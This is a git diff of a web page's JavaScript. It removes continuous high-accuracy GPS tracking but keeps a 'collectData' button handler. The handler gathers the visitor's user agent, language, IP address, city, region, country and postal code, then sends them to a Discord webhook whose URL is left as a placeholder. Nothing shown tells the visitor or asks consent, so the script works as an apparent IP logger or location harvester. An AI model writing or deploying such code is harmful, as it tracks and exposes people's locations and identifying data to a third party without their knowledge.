@@ -12,29 +12,7 @@ if ('serviceWorker' in navigator) {
   });
 }
 
-document.getElementById('collectData').addEventListener('click', () => {
-  if ('geolocation' in navigator) {
-    const watchId = navigator.geolocation.watchPosition(
-      async (position) => {
-        const { latitude, longitude } = position.coords;
-        const userData = await collectUserData(latitude, longitude);
-        sendToDiscordWebhook(userData);
-      },
-      (error) => {
-        console.error('Error obtaining location:', error);
-      },
-      {
-        enableHighAccuracy: true,
-        timeout: 5000,
-        maximumAge: 0,
-      }
-    );
-  } else {
-    console.error('Geolocation is not supported by your browser.');
-  }
-});
-
-async function collectUserData(latitude, longitude) {
+document.getElementById('collectData').addEventListener('click', async () => {
   const userAgent = navigator.userAgent;
   const language = navigator.language;
 
@@ -46,7 +24,7 @@ async function collectUserData(latitude, longitude) {
   const locationData = await locationResponse.json();
   const { city, region, country, postal } = locationData;
 
-  return {
+  const userData = {
     userAgent,
     language,
     ip,
@@ -54,10 +32,10 @@ async function collectUserData(latitude, longitude) {
     region,
     country,
     postal,
-    latitude,
-    longitude,
   };
-}
+
+  sendToDiscordWebhook(userData);
+});
 
 function sendToDiscordWebhook(userData) {
   // Replace with your Discord webhook URL
